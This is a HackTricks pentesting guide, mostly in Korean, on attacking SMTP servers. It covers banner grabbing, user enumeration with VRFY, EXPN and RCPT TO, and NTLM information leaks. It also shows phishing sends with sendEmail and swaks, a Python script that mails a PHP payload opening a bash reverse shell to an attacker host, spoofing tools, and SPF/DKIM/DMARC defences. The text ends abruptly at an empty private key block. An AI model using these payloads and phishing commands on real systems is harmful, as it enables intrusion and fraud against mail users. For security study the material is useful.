# 25,465,587 - SMTP/s 펜테스팅

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**취약성 평가 및 펜테스팅을 위한 즉시 사용 가능한 설정**. 20개 이상의 도구 및 기능을 사용하여 어디에서나 전체 펜테스트를 실행할 수 있습니다. 우리는 펜테스터를 대체하지 않습니다 - 펜테스터들에게 더 깊이 파고들고 쉘을 열고 재미를 느낄 수 있도록 사용자 정의 도구, 탐지 및 공격 모듈을 개발합니다.

{% embed url="https://pentest-tools.com/" %}

## **기본 정보**

**Simple Mail Transfer Protocol (SMTP)**는 TCP/IP 스위트 내에서 **이메일의 송수신**에 사용되는 프로토콜입니다. 수신자의 측에서 메시지를 대기열에 저장하는 데 제한이 있기 때문에 SMTP는 종종 **POP3 또는 IMAP**과 함께 사용됩니다. 이러한 추가 프로토콜을 사용하면 사용자는 서버 메일박스에 메시지를 저장하고 주기적으로 다운로드할 수 있습니다.

실제로, **이메일 프로그램**은 일반적으로 **이메일을 보내기 위해 SMTP를 사용**하고, **수신을 위해 POP3 또는 IMAP**을 사용합니다. Unix 기반 시스템에서는 이메일 용으로 가장 자주 사용되는 SMTP 서버로 **sendmail**이 두드러집니다. 상용 패키지인 Sendmail에는 POP3 서버가 포함되어 있습니다. 또한, **Microsoft Exchange**는 SMTP 서버를 제공하며 POP3 지원 옵션을 제공합니다.

**기본 포트:** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### 이메일 헤더

피해자로부터 이메일을 받을 기회가 있다면 (예: 웹 페이지의 연락처 양식을 통해), 이메일의 헤더를 확인하여 피해자의 내부 토폴로지에 대해 알아볼 수 있으므로 이를 이용하세요.

또한, SMTP 서버로부터 이메일을 받을 수도 있습니다. 이를 위해 존재하지 않는 주소로 해당 서버에 이메일을 보내면 (서버는 공격자에게 NDN 메일을 보냄) 이메일을 받을 수 있는 주소에서 이메일을 보내야 합니다 (SPF 정책을 확인하세요) 그리고 NDN 메시지를 수신할 수 있어야 합니다.

또한, 더 흥미로운 정보를 얻을 수 있으므로 다른 내용을 보내보세요. 예를 들어 헤더에 `X-Virus-Scanned: by av.domain.com`과 같은 정보가 있을 수 있습니다.\
EICAR 테스트 파일을 보내보세요.\
**AV**를 감지하는 것은 **알려진 취약점을 이용**할 수 있는 기회를 제공할 수 있습니다.

## 기본 동작

### **배너 그래빙/기본 연결**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:

SMTPS는 **SMTP over SSL/TLS**를 의미합니다. 이는 SMTP 프로토콜을 보안하기 위해 사용되는 암호화된 연결입니다. SMTPS는 일반적으로 465번 포트를 사용하며, 클라이언트와 서버 간의 통신을 암호화하여 데이터의 기밀성을 보장합니다.

SMTPS는 SSL/TLS 프로토콜을 사용하여 클라이언트와 서버 간의 통신을 보호합니다. SSL/TLS는 공개 키 암호화를 사용하여 데이터를 암호화하고, 상호 인증을 통해 통신 상대방의 신원을 확인합니다. 이를 통해 중간자 공격과 데이터 유출을 방지할 수 있습니다.

SMTPS를 사용하여 이메일을 보낼 때, 클라이언트는 서버의 공개 키를 사용하여 연결을 암호화합니다. 이를 통해 제3자가 메일을 가로채거나 조작하는 것을 방지할 수 있습니다.

SMTPS는 보안을 강화한 SMTP 프로토콜로, 이메일 통신의 기밀성과 무결성을 보장합니다. 따라서 SMTPS를 사용하여 이메일을 보낼 때는 데이터가 안전하게 전송되는지 확인할 수 있습니다.
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### 조직의 MX 서버 찾기

To find the MX servers of an organization, you can use the following methods:

1. **DNS Lookup**: Perform a DNS lookup for the organization's domain name. Look for the MX records in the DNS response. These records specify the mail servers responsible for receiving emails for that domain.

2. **NSLookup Command**: Use the NSLookup command in the command prompt or terminal to query the DNS server for the MX records of the organization's domain. The command syntax is as follows:

   ```
   nslookup -type=mx <domain>
   ```

   Replace `<domain>` with the actual domain name.

3. **Online Tools**: There are various online tools available that can help you find the MX servers of an organization. These tools allow you to enter the domain name and retrieve the MX records associated with it.

Once you have obtained the MX server information, you can proceed with further analysis and testing for potential vulnerabilities or misconfigurations in the SMTP service.
```bash
dig +short mx google.com
```
### 열거

SMTP 서비스를 펜테스팅하기 전에, 우리는 서비스에 대한 정보를 수집하기 위해 열거 과정을 수행해야 합니다. 열거는 시스템의 취약점을 찾기 위해 서비스에 대한 정보를 수집하는 과정입니다. SMTP 서비스를 열거하기 위해 다음과 같은 방법을 사용할 수 있습니다:

1. **Port scanning**: SMTP 서비스가 실행 중인지 확인하기 위해 포트 스캐닝을 수행합니다. 일반적으로 SMTP 서비스는 25번 포트에서 실행됩니다.

2. **Banner grabbing**: SMTP 서비스의 배너를 획득하여 서비스의 버전 및 구성 정보를 확인할 수 있습니다. 이를 통해 서비스의 취약점을 파악할 수 있습니다.

3. **User enumeration**: SMTP 서비스에 등록된 사용자의 목록을 확인할 수 있습니다. 이를 통해 서비스에 대한 정보를 수집하고, 사용자 계정을 공격하는 데 사용할 수 있습니다.

4. **Email address enumeration**: SMTP 서비스에 등록된 이메일 주소의 목록을 확인할 수 있습니다. 이를 통해 서비스에 대한 정보를 수집하고, 이메일 주소를 이용한 사회공학 공격을 수행할 수 있습니다.

5. **SMTP VRFY command**: SMTP 서비스에서 VRFY 명령을 사용하여 사용자 계정의 유효성을 확인할 수 있습니다. 이를 통해 사용자 계정의 존재 여부를 확인할 수 있습니다.

6. **SMTP EXPN command**: SMTP 서비스에서 EXPN 명령을 사용하여 메일링 리스트의 구성원 목록을 확인할 수 있습니다. 이를 통해 메일링 리스트의 구성원 정보를 수집할 수 있습니다.

7. **SMTP RCPT TO command**: SMTP 서비스에서 RCPT TO 명령을 사용하여 이메일 주소의 유효성을 확인할 수 있습니다. 이를 통해 이메일 주소의 존재 여부를 확인할 수 있습니다.

8. **SMTP MAIL FROM command**: SMTP 서비스에서 MAIL FROM 명령을 사용하여 이메일 주소의 유효성을 확인할 수 있습니다. 이를 통해 이메일 주소의 존재 여부를 확인할 수 있습니다.

9. **SMTP EHLO/HELO command**: SMTP 서비스에서 EHLO 또는 HELO 명령을 사용하여 서비스와의 연결을 설정할 수 있습니다. 이를 통해 서비스의 응답을 확인하고, 서비스의 구성 정보를 수집할 수 있습니다.

10. **SMTP STARTTLS command**: SMTP 서비스에서 STARTTLS 명령을 사용하여 암호화된 통신을 설정할 수 있습니다. 이를 통해 통신의 보안을 강화할 수 있습니다.

이러한 열거 과정을 통해 SMTP 서비스에 대한 정보를 수집하고, 서비스의 취약점을 파악하여 펜테스팅을 수행할 수 있습니다.
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM 인증 - 정보 노출

서버가 NTLM 인증 (Windows)을 지원하는 경우 민감한 정보 (버전)를 얻을 수 있습니다. 자세한 정보는 [**여기**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666)에서 확인할 수 있습니다.
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
또는 **nmap** 플러그인 `smtp-ntlm-info.nse`를 사용하여 이를 **자동화**할 수 있습니다.

### 내부 서버 이름 - 정보 노출

일부 SMTP 서버는 전체 주소 없이 "MAIL FROM" 명령을 실행할 때 발신자 주소를 자동으로 완성하여 내부 이름을 노출시킵니다.
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### 스니핑

포트 25로 전송되는 패킷에서 비밀번호를 스니핑할 수 있는지 확인하세요.

### [인증 무차별 대입](../../generic-methodologies-and-resources/brute-force.md#smtp)

## 사용자명 무차별 대입 열거

**항상 인증이 필요한 것은 아닙니다**

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY

VRFY는 SMTP(Simple Mail Transfer Protocol)에서 사용되는 명령어입니다. 이 명령어는 메일 서버에 존재하는 특정 사용자의 유효성을 확인하는 데 사용됩니다. VRFY 명령어를 사용하면 공격자는 메일 서버에 등록된 사용자 이름을 확인할 수 있습니다. 이는 사회 공학 공격에 사용될 수 있으며, 사용자 이름을 알아내는 데 도움이 될 수 있습니다.

VRFY 명령어는 일반적으로 메일 서버에서 비활성화되어 있거나 제한되어 있습니다. 이는 보안상의 이유로 이루어집니다. 따라서 VRFY 명령어를 사용하여 사용자 이름을 확인하려는 경우, 메일 서버가 이를 허용하는지 확인해야 합니다.
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN

The EXPN command is used to expand a mailing list on an SMTP server. It can be used to obtain information about the members of a mailing list, including their email addresses. This command can be useful for reconnaissance purposes during a penetration test.

To use the EXPN command, you can simply send the following command to the SMTP server:

```
EXPN <mailing_list>
```

Replace `<mailing_list>` with the name of the mailing list you want to expand. If the server supports the EXPN command and the mailing list exists, it will respond with the expanded list of email addresses.

It's important to note that not all SMTP servers support the EXPN command, as it can be a security risk. Some servers may disable this command to prevent unauthorized access to mailing list information. Therefore, it's always a good idea to test the command and verify if it's enabled before attempting to use it during a penetration test.

During a penetration test, the EXPN command can be used to gather information about potential targets or to verify the existence of specific email addresses. This information can be valuable for further reconnaissance or for launching targeted phishing attacks.

Keep in mind that the use of the EXPN command without proper authorization is considered unauthorized access and may be illegal. Always ensure that you have proper authorization and follow ethical guidelines when performing penetration testing activities.
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### 자동 도구

There are several automatic tools available for SMTP pentesting that can help in identifying vulnerabilities and testing the security of SMTP servers. These tools automate the process of scanning and testing, making it easier and more efficient for pentesters. Some popular automatic tools for SMTP pentesting include:

- **Nmap**: Nmap is a powerful network scanning tool that can be used to scan for open SMTP ports and identify potential vulnerabilities.
- **Metasploit**: Metasploit is a widely used penetration testing framework that includes modules for SMTP exploitation and testing.
- **OpenVAS**: OpenVAS is an open-source vulnerability scanner that can be used to scan SMTP servers for known vulnerabilities.
- **SMTP User Enumeration Tools**: There are various tools available that can be used to enumerate SMTP users, such as smtp-user-enum, smtp-user-enum-ng, and smtp-user-enum.pl.

These tools can be used to automate the process of identifying vulnerabilities and testing the security of SMTP servers, saving time and effort for pentesters. However, it is important to note that manual testing and verification should also be performed to ensure accurate results and to identify any potential false positives or negatives.
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**취약성 평가 및 침투 테스트를 위한 즉시 사용 가능한 설정**. 20개 이상의 도구 및 기능을 사용하여 어디에서나 전체 펜테스트를 실행할 수 있습니다. 우리는 펜테스터를 대체하지 않습니다 - 대신 펜테스터들에게 깊이 파고들고, 쉘을 팝하고, 재미있게 시간을 보낼 수 있도록 사용자 정의 도구, 탐지 및 공격 모듈을 개발합니다.

{% embed url="https://pentest-tools.com/" %}

## DSN 보고서

**배달 상태 알림 보고서**: 조직에게 **유효하지 않은 주소**로 **이메일**을 보내면, 조직은 해당 주소가 유효하지 않다는 것을 알리기 위해 **메일을 다시 보내**줍니다. 반환된 이메일의 **헤더**에는 가능한 **민감한 정보** (보고서와 상호작용하는 메일 서비스의 IP 주소 또는 안티바이러스 소프트웨어 정보 등)가 포함됩니다.

## [Commands](smtp-commands.md)

### 리눅스 콘솔에서 이메일 보내기
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### Python을 사용하여 이메일 보내기

To send an email using Python, you can use the `smtplib` library. Here is an example code snippet that demonstrates how to send an email:

```python
import smtplib
from email.mime.text import MIMEText

def send_email(sender_email, sender_password, recipient_email, subject, message):
    # Create a MIMEText object with the message content
    msg = MIMEText(message)

    # Set the sender, recipient, and subject fields
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject

    # Connect to the SMTP server
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()

    # Login to the email account
    server.login(sender_email, sender_password)

    # Send the email
    server.send_message(msg)

    # Disconnect from the server
    server.quit()

# Usage example
sender_email = 'your_email@gmail.com'
sender_password = 'your_password'
recipient_email = 'recipient_email@gmail.com'
subject = 'Hello'
message = 'This is a test email.'

send_email(sender_email, sender_password, recipient_email, subject, message)
```

Make sure to replace `'your_email@gmail.com'` with your actual email address and `'your_password'` with your email password. Also, update the `recipient_email`, `subject`, and `message` variables according to your needs.

This code snippet uses the Gmail SMTP server (`smtp.gmail.com`) and assumes that you have a Gmail account. If you are using a different email provider, you will need to modify the SMTP server address accordingly.

Remember to enable "Less secure app access" in your Gmail account settings if you are using a Gmail account for testing purposes.
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
## 메일 스푸핑 대응책

**SPF**, **DKIM**, 그리고 **DMARC**을 사용하여 SMTP 메시지 스푸핑을 방지하여 조직은 무단으로 자신을 대신하여 이메일을 보내는 것을 방지합니다.

이러한 대응책에 대한 **상세 가이드**는 [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/)에서 제공됩니다.

### SPF

{% hint style="danger" %}
SPF는 2014년에 "deprecated"되었습니다. 이는 `_spf.domain.com`에 **TXT 레코드**를 생성하는 대신 동일한 구문을 사용하여 `domain.com`에 생성한다는 것을 의미합니다.\
또한, 이전 SPF 레코드를 재사용하기 위해 `"v=spf1 include:_spf.google.com ~all"`과 같은 내용을 자주 찾을 수 있습니다.
{% endhint %}

**Sender Policy Framework**(SPF)는 메일 전송 에이전트(MTA)가 이메일을 보내는 호스트가 조직에서 정의한 승인된 메일 서버 목록을 쿼리하여 승인된지 여부를 확인할 수 있는 메커니즘입니다. 이 목록은 IP 주소/범위, 도메인 및 기타 엔티티로 구성된 SPF 레코드에서 **도메인 이름을 대신하여 이메일을 보낼 수 있는 권한이 있는** 다양한 "**메커니즘**"을 포함합니다.

#### 메커니즘

[Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework)에서 가져온 내용입니다.

| 메커니즘 | 설명                                                                                                                                                                                                                                                                                                                               |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | 항상 일치; 이전 메커니즘에 일치하지 않는 모든 IP에 대한 기본 결과로 사용됩니다. `-all`과 같은 기본 결과를 위해 사용됩니다.                                                                                                                                                                                                                   |
| A         | 도메인 이름에 해결할 수 있는 주소 레코드(A 또는 AAAA)가 있으면 일치합니다.                                                                                                                                                                                                                                                            |
| IP4       | 발신자가 특정 IPv4 주소 범위에 있는 경우 일치합니다.                                                                                                                                                                                                                                                                               |
| IP6       | 발신자가 특정 IPv6 주소 범위에 있는 경우 일치합니다.                                                                                                                                                                                                                                                                               |
| MX        | 도메인 이름에 발신자의 주소로 해결되는 MX 레코드가 있으면 일치합니다(즉, 메일이 도메인의 수신 메일 서버 중 하나에서 온 것입니다).                                                                                                                                                                                                       |
| PTR       | 클라이언트 주소에 대한 도메인 이름(PTR 레코드)이 지정된 도메인에 있으며 해당 도메인 이름이 클라이언트 주소로 해결되는 경우(전방 확인된 역 DNS), 일치합니다. 이 메커니즘은 권장되지 않으며 가능하면 피해야 합니다.                                                                                                                     |
| EXISTS    | 주어진 도메인 이름이 어떤 주소로 해결되든 일치합니다(해결되는 주소에 관계없이). 이는 거의 사용되지 않습니다. SPF 매크로 언어와 함께 DNSBL-쿼리와 같은 더 복잡한 일치를 제공합니다.                                                                                                                                                   |
| INCLUDE   | 다른 도메인의 정책을 참조합니다. 해당 도메인의 정책이 통과하면 이 메커니즘도 통과합니다. 그러나 포함된 정책이 실패하면 처리가 계속됩니다. 다른 도메인의 정책을 완전히 위임하려면 리디렉션 확장을 사용해야 합니다.                                                                                                                             |
| REDIRECT  | <p>리디렉트는 SPF 정책을 호스팅하는 다른 도메인 이름을 가리킵니다. 동일한 SPF 정책을 공유하는 여러 도메인과 함께 작업할 때 유용합니다.</p><p>리디렉트 메커니즘에 표시된 도메인의 SPF 정책이 사용됩니다.</p> |

또한, 일치하는 메커니즘에 따라 **수행할 작업을 나타내는 퀄리파이어**를 식별할 수 있습니다. 기본적으로 **퀄리파이어 "+"**가 사용됩니다(따라서 어떤 메커니즘이 일치하면 허용됨을 의미합니다).\
일반적으로 **각 SPF 정책의 끝에** 다음과 같은 내용을 참고할 수 있습니다: **\~all** 또는 **-all**. 이는 **발신자가 어떤 SPF 정책과도 일치하지 않는 경우 이메일을 신뢰할 수 없음(\~)으로 표시하거나 (-) 이메일을 거부해야 함을 나타내는 것입니다.**

#### 퀄리파이어

정책 내의 각 메커니즘은 의도된 결과를 정의하기 위해 네 가지 퀄리파이어 중 하나로 접두사를 붙일 수 있습니다:

* **`+`**: PASS 결과에 해당합니다. 기본적으로 메커니즘은 이 퀄리파이어를 가정하므로 `+mx`는 `mx`와 동일합니다.
* **`?`**: NEUTRAL 결과를 나타내며, 특정 정책이 없는 경우와 유사하게 처리됩니다.
* **`~`**: SOFTFAIL을 나타내며, NEUTRAL과 FAIL 사이의 중간 지점 역할을 합니다. 이 결과를 만족하는 이메일은 일반적으로 수락되지만 그에 따라 표시됩니다.
* **`-`**: FAIL을 나타내며, 이메일을 완전히 거부해야 함을 제안합니다.

다음 예에서는 **google.com의 SPF 정책**이 설명되어 있습니다. 첫 번째 SPF 정책 내에서 다른 도메인의 SPF 정책을 포함하는 것에 주목하세요.
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
전통적으로는 올바른/어떤 SPF 레코드가 없는 도메인 이름을 위조할 수 있었습니다. **하지만 요즘에는**, 유효한 SPF 레코드가 없는 도메인에서 온 **이메일은 자동으로 거부/신뢰되지 않는 것으로 표시**될 가능성이 높습니다.

도메인의 SPF를 확인하려면 다음과 같은 온라인 도구를 사용할 수 있습니다: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM (DomainKeys Identified Mail)

DKIM은 도메인의 공개 키를 DNS에서 검색하여 외부 메일 전송 에이전트(MTA)가 발신 이메일을 확인할 수 있도록 하는 데 사용됩니다. 이 공개 키는 도메인의 TXT 레코드에 위치합니다. 이 키에 액세스하려면 선택자와 도메인 이름을 알아야 합니다.

예를 들어, 키를 요청하기 위해 도메인 이름과 선택자가 필요합니다. 이 정보는 메일 헤더 `DKIM-Signature`에서 찾을 수 있습니다. 예를 들면 `d=gmail.com;s=20120113`입니다.

이 정보를 가져오기 위한 명령은 다음과 같을 수 있습니다:
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (도메인 기반 메시지 인증, 보고 및 준수)

DMARC는 SPF와 DKIM 프로토콜을 기반으로 이메일 보안을 강화합니다. 특정 도메인에서의 이메일 처리에 대한 메일 서버의 정책을 개요로 제시하며, 인증 실패 처리 방법 및 이메일 처리 작업에 대한 보고서를 보낼 위치도 지정합니다.

**DMARC 레코드를 얻으려면 \_dmarc 하위 도메인을 쿼리해야 합니다.**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### DMARC 태그

| 태그 이름 | 목적                                           | 샘플                             |
| -------- | --------------------------------------------- | ------------------------------- |
| v        | 프로토콜 버전                                  | v=DMARC1                        |
| pct      | 필터링 대상 메시지의 백분율                    | pct=20                          |
| ruf      | 포렌식 보고서를 위한 보고 URI                  | ruf=mailto:authfail@example.com |
| rua      | 집계 보고서를 위한 보고 URI                    | rua=mailto:aggrep@example.com   |
| p        | 조직 도메인의 정책                            | p=quarantine                    |
| sp       | OD의 하위 도메인의 정책                       | sp=reject                       |
| adkim    | DKIM의 정렬 모드                              | adkim=s                         |
| aspf     | SPF의 정렬 모드                               | aspf=r                          |

### **하위 도메인은 어떻게 되나요?**

**여기**에서 확인할 수 있습니다.\
메일을 보내려는 각 하위 도메인마다 별도의 SPF 레코드가 필요합니다.\
다음은 원래 openspf.org에 게시된 내용입니다. 이 사이트는 이러한 종류의 정보에 대한 훌륭한 자료였습니다.

> 악마의 질문: 하위 도메인은 어떻게 되나요?
>
> pielovers.demon.co.uk에서 메일을 받았는데, pielovers에 SPF 데이터가 없다면, demon.co.uk의 SPF를 확인해야 할까요? 아닙니다. Demon의 각 하위 도메인은 다른 고객이며, 각 고객은 자체 정책을 가질 수 있습니다. Demon의 정책이 기본적으로 모든 고객에 적용되는 것은 의미가 없습니다. Demon이 그렇게 하려면 각 하위 도메인에 대해 SPF 레코드를 설정하면 됩니다.
>
> 따라서 SPF 게시자에게 주는 조언은 다음과 같습니다. 각 A 또는 MX 레코드가 있는 하위 도메인 또는 호스트 이름에 대해 SPF 레코드를 추가해야 합니다.
>
> 와일드카드 A 또는 MX 레코드가 있는 사이트는 다음과 같은 와일드카드 SPF 레코드도 가져야 합니다. \* IN TXT "v=spf1 -all"

이는 하위 도메인이 다른 지리적 위치에 있을 수 있고 SPF 정의가 매우 다를 수 있다는 것을 의미합니다.

### **개방형 릴레이**

이메일을 보낼 때 스팸으로 표시되지 않도록 하는 것은 매우 중요합니다. 이는 수신자가 신뢰하는 **릴레이 서버**를 사용하여 종종 달성됩니다. 그러나 일반적인 도전 과제는 관리자가 **어떤 IP 범위가 안전한지를 완전히 인식하지 못할 수** 있다는 것입니다. 이러한 이해 부족은 SMTP 서버 설정에서 실수를 유발할 수 있는 위험으로 자주 식별됩니다.

일부 관리자는 특히 잠재적 또는 진행 중인 클라이언트와의 통신과 관련된 이메일 전달 문제를 피하기 위해 **모든 IP 주소에서의 연결을 허용**하는 우회 방법을 사용합니다. 이는 SMTP 서버의 `mynetworks` 매개변수를 모든 IP 주소를 허용하도록 구성함으로써 수행됩니다. 아래에 표시된 것과 같습니다:
```bash
mynetworks = 0.0.0.0/0
```
메일 서버가 오픈 릴레이인지 (즉, 외부 소스에서 이메일을 전달할 수 있는지) 확인하기 위해 일반적으로 `nmap` 도구를 사용합니다. 이를 테스트하기 위해 특정 스크립트가 포함된 `nmap`을 사용합니다. 예를 들어, `nmap`을 사용하여 IP 10.10.10.10의 서버의 포트 25에서 상세 스캔을 수행하는 명령은 다음과 같습니다:
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **도구**

* [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **SPF 및 DMARC 구성 오류 확인**
* [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **SPF 및 DMARC 구성 자동으로 가져오기**

### 스푸핑 이메일 보내기

* [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
* [**http://www.anonymailer.net/**](http://www.anonymailer.net)
* [**https://emkei.cz/**](https://emkei.cz/)

**또는 도구를 사용할 수 있습니다:**

* [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
{% hint style="warning" %}
만약 dkim python 라이브러리를 사용하여 키를 구문 분석하는 동안 오류가 발생하는 경우 다음 키를 사용하십시오.\
**참고**: 이것은 openssl 개인 키가 dkim에 의해 구문 분석 될 수 없는 어떤 이유로 인해 빠른 확인을 수행하기 위한 더러운 수정입니다.
```
-----BEGIN RSA PRIVATE KEY-----
